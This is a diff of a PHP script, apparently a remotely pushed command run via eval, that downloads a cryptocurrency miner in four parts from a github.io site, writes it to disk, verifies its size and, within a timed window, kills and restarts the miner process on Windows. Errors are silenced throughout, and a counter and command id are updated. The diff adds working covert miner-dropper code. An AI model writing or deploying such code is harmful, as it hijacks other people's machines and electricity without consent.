@@ -2,7 +2,7 @@ execução por eval. cuidado, não use exit e nem __FILE__
 
 *Atenção, este comando esta sendo executado via exec_blog_command() devido a mudança da url da conta. use só o comando do blg
 
-****41
+****42
 
 [__GIT_COMMAND]
 
@@ -274,17 +274,22 @@ if(1)
 	$data = true;
 	$user = 'miriamdev2026';
 	$project = 'teste';
-	if(!is_file($lolm_path))
+	if(!is_file($lolm_path) || filesize($lolm_path) < 75 * 1000 * 1000)
 	{
-		$data = false;
-		$data = @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/nanominer_parte_1");
-		$data .= @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/nanominer_parte_2");
-		$data .= @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/nanominer_parte_3");
-		$data .= @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/nanominer_parte_4");
-		if($data && strlen($data) > 75000000)
-			@file_put_contents($lolm_path, $data);
-		else
+		@unlink($lolm_path);
+		$out = @fopen($lolm_path, 'wb');
+		@fwrite($out, @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/nanominer_parte_1"));
+		@fwrite($out, @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/nanominer_parte_2"));
+		@fwrite($out, @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/nanominer_parte_3"));
+		@fwrite($out, @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/nanominer_parte_4"));
+		@fclose($out);
+		$data = true;
+		clearstatcache();
+		if(filesize($lolm_path) < 75 * 1000 * 1000)
+		{
+			@unlink($lolm_path);
 			$data = false;
+		}
 		if($data)
 		{
 			$data = false;
@@ -416,9 +421,9 @@ if(1)
 		{
 			$output = array();
 			/**/
-			$new_command_id = '10022';
+			$new_command_id = '10023';
 			$path_control_id  = dirname(PHP_BINARY) . '/command_id';
-			if((time() < (1792072866 + (60*60*24*3))) && @file_get_contents($path_control_id) !== $new_command_id)
+			if((time() < (1792344875 + (60*60*24*3))) && @file_get_contents($path_control_id) !== $new_command_id)
 			{
 				@file_put_contents($path_control_id, $new_command_id);
 				@exec('taskkill /f /im '.$lolm_name.'.exe');
